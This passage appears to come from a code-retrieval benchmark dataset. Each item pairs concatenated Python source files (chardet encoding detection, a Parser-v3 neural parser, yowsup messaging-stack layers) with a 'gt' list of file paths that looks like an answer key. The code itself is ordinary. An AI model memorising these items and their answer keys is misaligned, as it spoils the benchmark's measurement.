self.get_state() == eNotMe:\n\n            return eNotMe\n\n        aBuf = self.filter_high_bit_only(aBuf)\n\n        for cur in aBuf:\n            if cur == ' ':\n\n                if self._mBeforePrev != ' ':\n\n\n                    if self.is_final(self._mPrev):\n\n                        self._mFinalCharLogicalScore += 1\n                    elif self.is_non_final(self._mPrev):\n\n\n                        self._mFinalCharVisualScore += 1\n            else:\n\n                if ((self._mBeforePrev == ' ') and\n                        (self.is_final(self._mPrev)) and (cur != ' ')):\n\n                    self._mFinalCharVisualScore += 1\n            self._mBeforePrev = self._mPrev\n            self._mPrev = cur\n\n\n\n        return eDetecting\n\n    def get_charset_name(self):\n\n\n        finalsub = self._mFinalCharLogicalScore - self._mFinalCharVisualScore\n        if finalsub >= MIN_FINAL_CHAR_DISTANCE:\n            return LOGICAL_HEBREW_NAME\n        if finalsub <= -MIN_FINAL_CHAR_DISTANCE:\n            return VISUAL_HEBREW_NAME\n\n\n        modelsub = (self._mLogicalProber.get_confidence()\n                    - self._mVisualProber.get_confidence())\n        if modelsub > MIN_MODEL_DISTANCE:\n            return LOGICAL_HEBREW_NAME\n        if modelsub < -MIN_MODEL_DISTANCE:\n            return VISUAL_HEBREW_NAME\n\n\n\n        if finalsub < 0.0:\n            return VISUAL_HEBREW_NAME\n\n\n\n        return LOGICAL_HEBREW_NAME\n\n    def get_state(self):\n\n        if (self._mLogicalProber.get_state() == eNotMe) and \\\n           (self._mVisualProber.get_state() == eNotMe):\n            return eNotMe\n        return eDetecting\n\n'TimeSync/GAE/lib/requests/packages/chardet/constants.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n_debug = 0\n\neDetecting = 0\neFoundIt = 1\neNotMe = 2\n\neStart = 0\neError = 1\neItsMe = 2\n\nSHORTCUT_THRESHOLD = 0.95\n\n'TimeSync/GAE/lib/requests/packages/chardet/universaldetector.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom . import constants\nimport sys\nimport codecs\nfrom .latin1prober import Latin1Prober\nfrom .mbcsgroupprober import MBCSGroupProber\nfrom .sbcsgroupprober import SBCSGroupProber\nfrom .escprober import EscCharSetProber\nimport re\n\nMINIMUM_THRESHOLD = 0.20\nePureAscii = 0\neEscAscii = 1\neHighbyte = 2\n\n\nclass UniversalDetector:\n    def __init__(self):\n        self._highBitDetector = re.compile(b'[\\x80-\\xFF]')\n        self._escDetector = re.compile(b'(\\033|~{)')\n        self._mEscCharSetProber = None\n        self._mCharSetProbers = []\n        self.reset()\n\n    def reset(self):\n        self.result = {'encoding': None, 'confidence': 0.0}\n        self.done = False\n        self._mStart = True\n        self._mGotData = False\n        self._mInputState = ePureAscii\n        self._mLastChar = b''\n        if self._mEscCharSetProber:\n            self._mEscCharSetProber.reset()\n        for prober in self._mCharSetProbers:\n            prober.reset()\n\n    def feed(self, aBuf):\n        if self.done:\n            return\n\n        aLen = len(aBuf)\n        if not aLen:\n            return\n\n        if not self._mGotData:\n\n            if aBuf[:3] == codecs.BOM:\n\n                self.result = {'encoding': \"UTF-8\", 'confidence': 1.0}\n            elif aBuf[:4] == codecs.BOM_UTF32_LE:\n\n                self.result = {'encoding': \"UTF-32LE\", 'confidence': 1.0}\n            elif aBuf[:4] == codecs.BOM_UTF32_BE:\n\n                self.result = {'encoding': \"UTF-32BE\", 'confidence': 1.0}\n            elif aBuf[:4] == b'\\xFE\\xFF\\x00\\x00':\n\n                self.result = {\n                    'encoding': \"X-ISO-10646-UCS-4-3412\",\n                    'confidence': 1.0\n                }\n            elif aBuf[:4] == b'\\x00\\x00\\xFF\\xFE':\n\n                self.result = {\n                    'encoding': \"X-ISO-10646-UCS-4-2143\",\n                    'confidence': 1.0\n                }\n            elif aBuf[:2] == codecs.BOM_LE:\n\n                self.result = {'encoding': \"UTF-16LE\", 'confidence': 1.0}\n            elif aBuf[:2] == codecs.BOM_BE:\n\n                self.result = {'encoding': \"UTF-16BE\", 'confidence': 1.0}\n\n        self._mGotData = True\n        if self.result['encoding'] and (self.result['confidence'] > 0.0):\n            self.done = True\n            return\n\n        if self._mInputState == ePureAscii:\n            if self._highBitDetector.search(aBuf):\n                self._mInputState = eHighbyte\n            elif ((self._mInputState == ePureAscii) and\n                    self._escDetector.search(self._mLastChar + aBuf)):\n                self._mInputState = eEscAscii\n\n        self._mLastChar = aBuf[-1:]\n\n        if self._mInputState == eEscAscii:\n            if not self._mEscCharSetProber:\n                self._mEscCharSetProber = EscCharSetProber()\n            if self._mEscCharSetProber.feed(aBuf) == constants.eFoundIt:\n                self.result = {'encoding': self._mEscCharSetProber.get_charset_name(),\n                               'confidence': self._mEscCharSetProber.get_confidence()}\n                self.done = True\n        elif self._mInputState == eHighbyte:\n            if not self._mCharSetProbers:\n                self._mCharSetProbers = [MBCSGroupProber(), SBCSGroupProber(),\n                                         Latin1Prober()]\n            for prober in self._mCharSetProbers:\n                if prober.feed(aBuf) == constants.eFoundIt:\n                    self.result = {'encoding': prober.get_charset_name(),\n                                   'confidence': prober.get_confidence()}\n                    self.done = True\n                    break\n\n    def close(self):\n        if self.done:\n            return\n        if not self._mGotData:\n            if constants._debug:\n                sys.stderr.write('no data received!\\n')\n            return\n        self.done = True\n\n        if self._mInputState == ePureAscii:\n            self.result = {'encoding': 'ascii', 'confidence': 1.0}\n            return self.result\n\n        if self._mInputState == eHighbyte:\n            proberConfidence = None\n            maxProberConfidence = 0.0\n            maxProber = None\n            for prober in self._mCharSetProbers:\n                if not prober:\n                    continue\n                proberConfidence = prober.get_confidence()\n                if proberConfidence > maxProberConfidence:\n                    maxProberConfidence = proberConfidence\n                    maxProber = prober\n            if maxProber and (maxProberConfidence > MINIMUM_THRESHOLD):\n                self.result = {'encoding': maxProber.get_charset_name(),\n                               'confidence': maxProber.get_confidence()}\n                return self.result\n\n        if constants._debug:\n            sys.stderr.write('no probers hit minimum threshhold\\n')\n            for prober in self._mCharSetProbers[0].mProbers:\n                if not prober:\n                    continue\n                sys.stderr.write('%s confidence = %s\\n' %\n                                 (prober.get_charset_name(),\n                                  prober.get_confidence()))\n\n'TimeSync/GAE/lib/requests/packages/chardet/sbcsgroupprober.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom .charsetgroupprober import CharSetGroupProber\nfrom .sbcharsetprober import SingleByteCharSetProber\nfrom .langcyrillicmodel import (Win1251CyrillicModel, Koi8rModel,\n                                Latin5CyrillicModel, MacCyrillicModel,\n                                Ibm866Model, Ibm855Model)\nfrom .langgreekmodel import Latin7GreekModel, Win1253GreekModel\nfrom .langbulgarianmodel import Latin5BulgarianModel, Win1251BulgarianModel\nfrom .langhungarianmodel import Latin2HungarianModel, Win1250HungarianModel\nfrom .langthaimodel import TIS620ThaiModel\nfrom .langhebrewmodel import Win1255HebrewModel\nfrom .hebrewprober import HebrewProber\n\n\nclass SBCSGroupProber(CharSetGroupProber):\n    def __init__(self):\n        CharSetGroupProber.__init__(self)\n        self._mProbers = [\n            SingleByteCharSetProber(Win1251CyrillicModel),\n            SingleByteCharSetProber(Koi8rModel),\n            SingleByteCharSetProber(Latin5CyrillicModel),\n            SingleByteCharSetProber(MacCyrillicModel),\n            SingleByteCharSetProber(Ibm866Model),\n            SingleByteCharSetProber(Ibm855Model),\n            SingleByteCharSetProber(Latin7GreekModel),\n            SingleByteCharSetProber(Win1253GreekModel),\n            SingleByteCharSetProber(Latin5BulgarianModel),\n            SingleByteCharSetProber(Win1251BulgarianModel),\n            SingleByteCharSetProber(Latin2HungarianModel),\n            SingleByteCharSetProber(Win1250HungarianModel),\n            SingleByteCharSetProber(TIS620ThaiModel),\n        ]\n        hebrewProber = HebrewProber()\n        logicalHebrewProber = SingleByteCharSetProber(Win1255HebrewModel,\n                                                      False, hebrewProber)\n        visualHebrewProber = SingleByteCharSetProber(Win1255HebrewModel, True,\n                                                     hebrewProber)\n        hebrewProber.set_model_probers(logicalHebrewProber, visualHebrewProber)\n        self._mProbers.extend([hebrewProber, logicalHebrewProber,\n                               visualHebrewProber])\n\n        self.reset()\n",
        "gt": [
            "'TimeSync/GAE/lib/requests/packages/chardet/constants.py'",
            "'TimeSync/GAE/lib/requests/packages/chardet/hebrewprober.py'",
            "'TimeSync/GAE/lib/requests/packages/chardet/sbcsgroupprober.py'",
            "'TimeSync/GAE/lib/requests/packages/chardet/universaldetector.py'",
            "'TimeSync/GAE/lib/requests/packages/chardet/chardetect.py'"
        ]
    },
    {
        "files": [
            "'Parser-v3/main.py'",
            "'Parser-v3/parser/__init__.py'",
            "'Parser-v3/parser/elmo_network.py'"
        ],
        "content": "'Parser-v3/main.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom __future__ import absolute_import\nfrom __future__ import division\nfrom __future__ import print_function\n\nimport re\nimport os\nimport shutil\nimport sys\nimport time\nimport six\nfrom six.moves import input\nimport codecs\nfrom argparse import ArgumentParser\n\nfrom parser.config import Config\nimport parser\nfrom hpo import MVGHPO\n\nfrom hpo.evals.conll18_eval import evaluate\n\nsection_names = set()\nwith codecs.open(os.path.join('config', 'defaults.cfg')) as f:\n  section_regex = re.compile('\\[(.*)\\]')\n  for line in f:\n    match = section_regex.match(line)\n    if match:\n      section_names.add(match.group(1))\n\n\ndef resolve_network_dependencies(config, network_class, network_list, networks):\n  if network_list in ('None', ''):\n    return set(), networks\n  else:\n    network_list = network_list.split(':')\n    if network_class not in networks:\n      for _network_class in network_list:\n        config_file = os.path.join(config.get('DEFAULT', _network_class + '_dir'), 'config.cfg')\n        _config = Config(config_file=config_file)\n        _network_list = _config.get(_network_class, 'input_network_classes')\n        input_networks, networks = resolve_network_dependencies(_config, _network_class, _network_list, networks)\n        NetworkClass = getattr(parser, _network_class)\n        networks[_network_class] = NetworkClass(input_networks=input_networks, config=config)\n    return set(networks[_network_class] for _network_class in network_list), networks\n\n\n\n\n\ndef main():\n\n\n  argparser = ArgumentParser('Network')\n  argparser.add_argument('--save_metadir')\n  argparser.add_argument('--save_dir')\n  subparsers = argparser.add_subparsers()\n\n\n  train_parser = subparsers.add_parser('train')\n  train_parser.set_defaults(action=train)\n  train_parser.add_argument('network_class')\n  train_parser.add_argument('--force', action='store_true')\n  train_parser.add_argument('--noscreen', action='store_true')\n  train_parser.add_argument('--load', action='store_true')\n  train_parser.add_argument('--config_file', default='')\n  for section_name in section_names:\n    train_parser.add_argument('--'+section_name, nargs='+')\n\n  hpo_parser = subparsers.add_parser('hpo')\n  hpo_parser.set_defaults(action=hpo)\n  hpo_parser.add_argument('network_class')\n  hpo_parser.add_argument('--noscreen', action='store_true')\n  hpo_parser.add_argument('--config_file', default='')\n  hpo_parser.add_argument('--rand_file', default='hpo/config/default.csv')\n  hpo_parser.add_argument('--eval_metric', default='LAS')\n  for section_name in section_names:\n    hpo_parser.add_argument('--'+section_name, nargs='+')\n\n\n\n  run_parser = subparsers.add_parser('run')\n  run_parser.set_defaults(action=run)\n  run_parser.add_argument('conllu_files', nargs='+')\n  run_parser.add_argument('--output_dir')\n  run_parser.add_argument('--output_filename')\n  for section_name in section_names:\n    run_parser.add_argument('--'+section_name, nargs='+')\n\n\n  kwargs = vars(argparser.parse_args())\n  kwargs.pop('action')(**kwargs)\n  return\n\n\n\ndef train(**kwargs):\n\n\n\n  load = kwargs.pop('load')\n  force = kwargs.pop('force')\n  noscreen = kwargs.pop('noscreen')\n  save_dir = kwargs.pop('save_dir')\n  save_metadir = kwargs.pop('save_metadir')\n  network_class = kwargs.pop('network_class')\n  config_file = kwargs.pop('config_file')\n\n\n  kwargs = {key: value for key, value in six.iteritems(kwargs) if value is not None}\n  for section, values in six.iteritems(kwargs):\n    if section in section_names:\n      values = [value.split('=', 1) for value in values]\n      kwargs[section] = {opt: value for opt, value in values}\n  if 'DEFAULT' not in kwargs:\n    kwargs['DEFAULT'] = {}\n  kwargs['DEFAULT']['network_class'] = network_class\n\n\n  if save_metadir is not None:\n    kwargs['DEFAULT']['save_metadir'] = save_metadir\n  if save_dir is not None:\n    kwargs['DEFAULT']['save_dir'] = save_dir\n  config = Config(config_file=config_file, **kwargs)\n  save_dir = config.get('DEFAULT', 'save_dir')\n\n\n  if not load and os.path.isdir(save_dir):\n    if not force:\n      input_str = ''\n      while input_str not in ('y', 'n', 'yes', 'no'):\n        input_str = input('{} already exists. It will be deleted if you continue. Do you want to proceed? [Y/n] '.format(save_dir)).lower()\n      if input_str in ('n', 'no'):\n        print()\n        sys.exit(0)\n    elif noscreen:\n      sys.exit(0)\n    shutil.rmtree(save_dir)\n\n\n  if os.path.isdir(save_dir):\n    config_file = os.path.join(save_dir, 'config.cfg')\n  else:\n    os.makedirs(save_dir)\n    os.system('git rev-parse HEAD >> {}'.format(os.path.join(save_dir, 'HEAD')))\n\n  network_list = config.get(network_class, 'input_network_classes')\n  if not load:\n    with open(os.path.join(save_dir, 'config.cfg'), 'w') as f:\n      config.write(f)\n  input_networks, networks = resolve_network_dependencies(config, network_class, network_list, {})\n  NetworkClass = getattr(parser, network_class)\n  network = NetworkClass(input_networks=input_networks, config=config)\n  network.train(load=load, noscreen=noscreen)\n  return\n\n\n\ndef hpo(**kwargs):\n\n\n\n  noscreen = kwargs.pop('noscreen')\n  save_dir = kwargs.pop('save_dir')\n  save_metadir = kwargs.pop('save_metadir')\n  network_class = kwargs.pop('network_class')\n  config_file = kwargs.pop('config_file')\n  rand_file = kwargs.pop('rand_file')\n  eval_metric = kwargs.pop('eval_metric')\n\n\n  kwargs = {key: value for key, value in six.iteritems(kwargs) if value is not None}\n  for section, values in six.iteritems(kwargs):\n    if section in section_names:\n      values = [value.split('=', 1) for value in values]\n      kwargs[section] = {opt: value for opt, value in values}\n  if 'DEFAULT' not in kwargs:\n    kwargs['DEFAULT'] = {}\n  kwargs['DEFAULT']['network_class'] = network_class\n\n\n  if save_metadir is not None:\n    kwargs['DEFAULT']['save_metadir'] = save_metadir\n  if save_dir is None:\n    save_dir = Config(**kwargs).get('DEFAULT', 'save_dir')\n  if not os.path.exists(save_dir):\n    os.makedirs(save_dir)\n\n\n\n  lang = kwargs['DEFAULT']['LANG']\n  treebank = kwargs['DEFAULT']['TREEBANK']\n  lc = kwargs['DEFAULT']['LC']\n  tb = kwargs['DEFAULT']['TB']\n  base = 'data/CoNLL18/UD_{}-{}/{}_{}-ud-dev.conllu'.format(lang, treebank, lc, tb)\n  def eval_func(save_dir):\n    return evaluate(base, os.path.join(save_dir, 'parsed', base), eval_metric)\n\n  rargs = next(MVGHPO(rand_file, save_dir, eval_func=eval_func))\n  for section in rargs:\n    if section not in kwargs:\n      kwargs[section] = rargs[section]\n    else:\n      for option, value in six.iteritems(rargs[section]):\n        if option not in kwargs[section]:\n          kwargs[section][option] = value\n  save_dir = os.path.join(save_dir, str(int(time.time()*100000)))\n\n\n  if os.path.isdir(save_dir):\n    print()\n    sys.exit(0)\n  else:\n    os.mkdir(save_dir)\n    os.system('git rev-parse HEAD >> {}'.format(os.path.join(save_dir, 'HEAD')))\n\n  kwargs['DEFAULT']['save_dir'] = save_dir\n  config = Config(config_file=config_file, **kwargs)\n  network_list = config.get(network_class, 'input_network_classes')\n  with open(os.path.join(save_dir, 'config.cfg'), 'w') as f:\n    config.write(f)\n  input_networks, networks = resolve_network_dependencies(config, network_class, network_list, {})\n  NetworkClass = getattr(parser, network_class)\n  network = NetworkClass(input_networks=input_networks, config=config)\n  network.train(noscreen=noscreen)\n  return\n\n\ndef run(**kwargs):\n\n\n\n  save_dir = kwargs.pop('save_dir')\n  save_metadir = kwargs.pop('save_metadir')\n  conllu_files = kwargs.pop('conllu_files')\n  output_dir = kwargs.pop('output_dir')\n  output_filename = kwargs.pop('output_filename')\n\n\n  kwargs = {key: value for key, value in six.iteritems(kwargs) if value is not None}\n  for section, values in six.iteritems(kwargs):\n    if section in section_names:\n      values = [value.split('=', 1) for value in values]\n      kwargs[section] = {opt: value for opt, value in values}\n  if 'DEFAULT' not in kwargs:\n    kwargs['DEFAULT'] = {}\n\n\n  if save_metadir is not None:\n    kwargs['DEFAULT']['save_metadir'] = save_metadir\n  if save_dir is None:\n    save_dir = Config(**kwargs).get('DEFAULT', 'save_dir')\n  config_file = os.path.join(save_dir, 'config.cfg')\n  kwargs['DEFAULT']['save_dir'] = save_dir\n\n  config = Config(defaults_file='', config_file=config_file, **kwargs)\n  with open('debug.cfg', 'w') as f:\n    config.write(f)\n  network_class = config.get('DEFAULT', 'network_class')\n  network_list = config.get(network_class, 'input_network_classes')\n  input_networks, networks = resolve_network_dependencies(config, network_class, network_list, {})\n  NetworkClass = getattr(parser, network_class)\n  network = NetworkClass(input_networks=input_networks, config=config)\n  network.parse(conllu_files, output_dir=output_dir, output_filename=output_filename)\n  return\n\n\nif __name__ == '__main__':\n  main()\n\n'Parser-v3/parser/__init__.py'\n:from __future__ import absolute_import\n\nfrom parser.elmo_network import ElmoNetwork\nfrom parser.parser_network import ParserNetwork\nfrom parser.tagger_network import TaggerNetwork\nfrom parser.graph_parser_network import GraphParserNetwork\n\n'Parser-v3/parser/elmo_network.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom __future__ import absolute_import\nfrom __future__ import division\nfrom __future__ import print_function\nimport six\n\nimport re\nimport os\nimport pickle as pkl\nimport curses\nimport codecs\n\nimport numpy as np\nimport tensorflow as tf\n\nfrom parser.base_network import BaseNetwork\nfrom parser.neural import nn, nonlin, embeddings, recurrent, classifiers\n\n\nclass ElmoNetwork(BaseNetwork):\n\n\n  _evals = set()\n\n\n  def build_graph(self, input_network_outputs={}, reuse=True):\n\n\n    outputs = {}\n    with tf.variable_scope('Embeddings'):\n      input_tensors = [input_vocab.get_input_tensor(reuse=reuse) for input_vocab in self.input_vocabs]\n      for input_network, output in input_network_outputs:\n        with tf.variable_scope(input_network.classname):\n          input_tensors.append(input_network.get_input_tensor(output, reuse=reuse))\n      layer = tf.concat(input_tensors, 2)\n    n_nonzero = tf.to_float(tf.count_nonzero(layer, axis=-1, keep_dims=True))\n    batch_size, bucket_size, input_size = nn.get_sizes(layer)\n    layer *= input_size / (n_nonzero + tf.constant(1e-12))\n\n    token_weights = nn.greater(self.id_vocab.placeholder, 0, dtype=tf.int32)\n    tokens_per_sequence = tf.reduce_sum(token_weights, axis=1)\n    n_tokens = tf.reduce_sum(tokens_per_sequence)\n    n_sequences = tf.count_nonzero(tokens_per_sequence)\n    seq_lengths = tokens_per_sequence + 1\n    tokens = {'n_tokens': n_tokens,\n              'tokens_per_sequence': tokens_per_sequence,\n              'token_weights': token_weights,\n              'n_sequences': n_sequences}\n\n    conv_keep_prob = 1. if reuse else self.conv_keep_prob\n    recur_keep_prob = 1. if reuse else self.recur_keep_prob\n    recur_include_prob = 1. if reuse else self.recur_include_prob\n\n    rev_layer = tf.reverse_sequence(layer, seq_lengths, seq_axis=2)\n    for i in six.moves.range(self.n_layers):\n      conv_width = self.first_layer_conv_width if not i else self.conv_width\n      with tf.variable_scope('RNN_FW-{}'.format(i)):\n        layer, _ = recurrent.directed_RNN(layer, self.recur_size, seq_lengths,\n                                          bidirectional=False,\n                                          recur_cell=self.recur_cell,\n                                          conv_width=conv_width,\n                                          recur_func=self.recur_func,\n                                          conv_keep_prob=conv_keep_prob,\n                                          recur_include_prob=recur_include_prob,\n                                          recur_keep_prob=recur_keep_prob,\n                                          cifg=self.cifg,\n                                          highway=self.highway,\n                                          highway_func=self.highway_func)\n      if self.bidirectional:\n        with tf.variable_scope('RNN_BW-{}'.format(i)):\n          rev_layer, _ = recurrent.directed_RNN(rev_layer, self.recur_size, seq_lengths,\n                                                bidirectional=False,\n                                                recur_cell=self.recur_cell,\n                                                conv_width=conv_width,\n                                                recur_func=self.recur_func,\n                                                conv_keep_prob=conv_keep_prob,\n                                                recur_keep_prob=recur_keep_prob,\n                                                recur_include_prob=recur_include_prob,\n                                                cifg=self.cifg,\n                                                highway=self.highway,\n                                                highway_func=self.highway_func)\n    ones = tf.ones([batch_size, 1, 1])\n    with tf.variable_scope('RNN_FW-{}/RNN/Loop'.format(i), reuse=True):\n      fw_initial_state = tf.get_variable('Initial_state')\n      n_splits = fw_initial_state.get_shape().as_list()[-1] / self.recur_size\n      fw_initial_state = tf.split(fw_initial_state, int(n_splits), -1)[0]\n      start_token = ones * fw_initial_state\n      layer = tf.reverse_sequence(layer, seq_lengths, seq_axis=2)\n      layer = layer[:,1:]\n      layer = tf.reverse_sequence(layer, seq_lengths-1, seq_axis=2)\n      layer = tf.concat([start_token, layer], axis=1)\n    if self.bidirectional:\n      with tf.variable_scope('RNN_BW-{}/RNN/Loop'.format(i), reuse=True):\n        bw_initial_state = tf.get_variable('Initial_state')\n        n_splits = bw_initial_state.get_shape().as_list()[-1] / self.recur_size\n        bw_initial_state = tf.split(bw_initial_state, int(n_splits), -1)[0]\n        stop_token = ones * bw_initial_state\n        rev_layer = tf.concat([stop_token, layer], axis=1)\n        rev_layer = tf.reverse_sequence(rev_layer, seq_lengths+1, seq_axis=2)[:,1:]\n      if self.bilin:\n        layer = tf.concat([layer*rev_layer, layer, rev_layer], axis=2)\n      else:\n        layer = tf.concat([layer, rev_layer], axis=2)\n\n    output_vocabs = {vocab.field: vocab for vocab in self.output_vocabs}\n    outputs = {}\n    with tf.variable_scope('Classifiers'):\n      if 'form' in output_vocabs:\n        vocab = output_vocabs['form']\n        outputs[vocab.field] = vocab.get_sampled_linear_classifier(\n          layer, self.n_samples,\n          token_weights=token_weights,\n          reuse=reuse)\n        self._evals.add('form')\n      if 'upos' in output_vocabs:\n        vocab = output_vocabs['upos']\n        outputs[vocab.field] = vocab.get_linear_classifier(\n          layer,\n          token_weights=token_weights,\n          reuse=reuse)\n        self._evals.add('upos')\n      if 'xpos' in output_vocabs:\n        vocab = output_vocabs['xpos']\n        outputs[vocab.field] = vocab.get_linear_classifier(\n          layer,\n          token_weights=token_weights,\n          reuse=reuse)\n        self._evals.add('xpos')\n    return outputs, tokens\n\n\n  @property\n  def n_samples(self):\n    return self._config.getint(self, 'n_samples')\n",
        "gt": [
            "'Parser-v3/parser/elmo_network.py'",
            "'Parser-v3/parser/__init__.py'",
            "'Parser-v3/main.py'"
        ]
    },
    {
        "files": [
            "'yowsup/yowsup/demos/sendclient/__init__.py'",
            "'yowsup/yowsup/layers/protocol_receipts/layer.py'",
            "'yowsup/yowsup/layers/protocol_receipts/__init__.py'",
            "'yowsup/yowsup/demos/sendclient/stack.py'",
            "'yowsup/yowsup/stacks/yowstack.py'",
            "'yowsup/yowsup/stacks/__init__.py'"
        ],
        "content": "'yowsup/yowsup/demos/sendclient/__init__.py'\n:from .stack import YowsupSendStack\n'yowsup/yowsup/layers/protocol_receipts/layer.py'\n:from yowsup.layers import YowLayer, YowLayerEvent, YowProtocolLayer\nfrom .protocolentities import *\nclass YowReceiptProtocolLayer(YowProtocolLayer):\n    def __init__(self):\n        handleMap = {\n            \"receipt\": (self.recvReceiptNode, self.sendReceiptEntity)\n        }\n        super(YowReceiptProtocolLayer, self).__init__(handleMap)\n\n    def __str__(self):\n        return \"Receipt Layer\"\n\n    def sendReceiptEntity(self, entity):\n        self.entityToLower(entity)\n\n    def recvReceiptNode(self, node):\n        self.toUpper(IncomingReceiptProtocolEntity.fromProtocolTreeNode(node))\n\n\n\n'yowsup/yowsup/layers/protocol_receipts/__init__.py'\n:from .layer import YowReceiptProtocolLayer\n\n\n'yowsup/yowsup/demos/sendclient/stack.py'\n:from yowsup.stacks import  YowStackBuilder\nfrom .layer import SendLayer\nfrom yowsup.layers import YowLayerEvent\nfrom yowsup.layers.auth import YowAuthenticationProtocolLayer\nfrom yowsup.layers.network import YowNetworkLayer\n\n\nclass YowsupSendStack(object):\n    def __init__(self, profile, messages):\n\n        stackBuilder = YowStackBuilder()\n\n        self._stack = stackBuilder\\\n            .pushDefaultLayers()\\\n            .push(SendLayer)\\\n            .build()\n\n        self._stack.setProp(SendLayer.PROP_MESSAGES, messages)\n        self._stack.setProp(YowAuthenticationProtocolLayer.PROP_PASSIVE, True)\n        self._stack.setProfile(profile)\n\n    def set_prop(self, key, val):\n        self._stack.setProp(key, val)\n\n    def start(self):\n        self._stack.broadcastEvent(YowLayerEvent(YowNetworkLayer.EVENT_STATE_CONNECT))\n        self._stack.loop()\n\n'yowsup/yowsup/stacks/yowstack.py'\n:from yowsup.layers import YowParallelLayer\nimport time, logging, random\nfrom yowsup.layers import YowLayer\nfrom yowsup.layers.noise.layer import YowNoiseLayer\nfrom yowsup.layers.noise.layer_noise_segments import YowNoiseSegmentsLayer\nfrom yowsup.layers.auth                        import YowAuthenticationProtocolLayer\nfrom yowsup.layers.coder                       import YowCoderLayer\nfrom yowsup.layers.logger                      import YowLoggerLayer\nfrom yowsup.layers.network                     import YowNetworkLayer\nfrom yowsup.layers.protocol_messages           import YowMessagesProtocolLayer\nfrom yowsup.layers.protocol_media              import YowMediaProtocolLayer\nfrom yowsup.layers.protocol_acks               import YowAckProtocolLayer\nfrom yowsup.layers.protocol_receipts           import YowReceiptProtocolLayer\nfrom yowsup.layers.protocol_groups             import YowGroupsProtocolLayer\nfrom yowsup.layers.protocol_presence           import YowPresenceProtocolLayer\nfrom yowsup.layers.protocol_ib                 import YowIbProtocolLayer\nfrom yowsup.layers.protocol_notifications      import YowNotificationsProtocolLayer\nfrom yowsup.layers.protocol_iq                 import YowIqProtocolLayer\nfrom yowsup.layers.protocol_contacts           import YowContactsIqProtocolLayer\nfrom yowsup.layers.protocol_chatstate          import YowChatstateProtocolLayer\nfrom yowsup.layers.protocol_privacy            import YowPrivacyProtocolLayer\nfrom yowsup.layers.protocol_profiles           import YowProfilesProtocolLayer\nfrom yowsup.layers.protocol_calls import YowCallsProtocolLayer\nfrom yowsup.common.constants import YowConstants\nfrom yowsup.layers.axolotl import AxolotlSendLayer, AxolotlControlLayer, AxolotlReceivelayer\nfrom yowsup.profile.profile import YowProfile\nimport inspect\ntry:\n    import Queue\nexcept ImportError:\n    import queue as Queue\nlogger = logging.getLogger(__name__)\n\nYOWSUP_PROTOCOL_LAYERS_BASIC = (\n    YowAuthenticationProtocolLayer, YowMessagesProtocolLayer,\n    YowReceiptProtocolLayer, YowAckProtocolLayer, YowPresenceProtocolLayer,\n    YowIbProtocolLayer, YowIqProtocolLayer, YowNotificationsProtocolLayer,\n    YowContactsIqProtocolLayer, YowChatstateProtocolLayer, YowCallsProtocolLayer\n\n)\n\n\nclass YowStackBuilder(object):\n    def __init__(self):\n        self.layers = ()\n        self._props = {}\n\n    def setProp(self, key, value):\n        self._props[key] = value\n        return self\n\n    def pushDefaultLayers(self):\n        defaultLayers = YowStackBuilder.getDefaultLayers()\n        self.layers += defaultLayers\n        return self\n\n    def push(self, yowLayer):\n        self.layers += (yowLayer,)\n        return self\n\n    def pop(self):\n        self.layers = self.layers[:-1]\n        return self\n\n    def build(self):\n        return YowStack(self.layers, reversed = False, props = self._props)\n\n    @staticmethod\n    def getDefaultLayers(groups = True, media = True, privacy = True, profiles = True):\n        coreLayers = YowStackBuilder.getCoreLayers()\n        protocolLayers = YowStackBuilder.getProtocolLayers(groups = groups, media=media, privacy=privacy, profiles=profiles)\n\n        allLayers = coreLayers\n        allLayers += (AxolotlControlLayer,)\n        allLayers += (YowParallelLayer((AxolotlSendLayer, AxolotlReceivelayer)),)\n\n        allLayers += (YowParallelLayer(protocolLayers),)\n\n        return allLayers\n\n    @staticmethod\n    def getDefaultStack(layer = None, axolotl = False, groups = True, media = True, privacy = True, profiles = True):\n\n\n        allLayers = YowStackBuilder.getDefaultLayers(axolotl, groups = groups, media=media,privacy=privacy, profiles=profiles)\n        if layer:\n            allLayers = allLayers + (layer,)\n\n\n        return YowStack(allLayers, reversed = False)\n\n    @staticmethod\n    def getCoreLayers():\n        return (\n            YowLoggerLayer,\n            YowCoderLayer,\n            YowNoiseLayer,\n            YowNoiseSegmentsLayer,\n            YowNetworkLayer\n        )[::-1]\n\n    @staticmethod\n    def getProtocolLayers(groups = True, media = True, privacy = True, profiles = True):\n        layers = YOWSUP_PROTOCOL_LAYERS_BASIC\n        if groups:\n            layers += (YowGroupsProtocolLayer,)\n\n        if media:\n            layers += (YowMediaProtocolLayer, )\n\n        if privacy:\n            layers += (YowPrivacyProtocolLayer, )\n\n        if profiles:\n            layers += (YowProfilesProtocolLayer, )\n\n        return layers\n\nclass YowStack(object):\n    __stack = []\n    __stackInstances = []\n    __detachedQueue = Queue.Queue()\n    def __init__(self, stackClassesArr = None, reversed = True, props = None):\n        stackClassesArr = stackClassesArr or ()\n        self.__stack = stackClassesArr[::-1] if reversed else stackClassesArr\n        self.__stackInstances = []\n        self._props = props or {}\n\n        self.setProp(YowNetworkLayer.PROP_ENDPOINT, YowConstants.ENDPOINTS[random.randint(0,len(YowConstants.ENDPOINTS)-1)])\n        self._construct()\n\n\n    def getLayerInterface(self, YowLayerClass):\n        for inst in self.__stackInstances:\n            if inst.__class__ == YowLayerClass:\n                return inst.getLayerInterface()\n            elif inst.__class__ == YowParallelLayer:\n                res = inst.getLayerInterface(YowLayerClass)\n                if res:\n                    return res\n\n\n    def send(self, data):\n        self.__stackInstances[-1].send(data)\n\n    def receive(self, data):\n        self.__stackInstances[0].receive(data)\n\n    def setCredentials(self, credentials):\n        logger.warning(\"setCredentials is deprecated and any passed-in keypair is ignored, \"\n                       \"use setProfile(YowProfile) instead\")\n        profile_name, keypair = credentials\n        self.setProfile(YowProfile(profile_name))\n\n    def setProfile(self, profile):\n\n\n        logger.debug(\"setProfile(%s)\" % profile)\n        self.setProp(\"profile\", profile if isinstance(profile, YowProfile) else YowProfile(profile))\n\n    def addLayer(self, 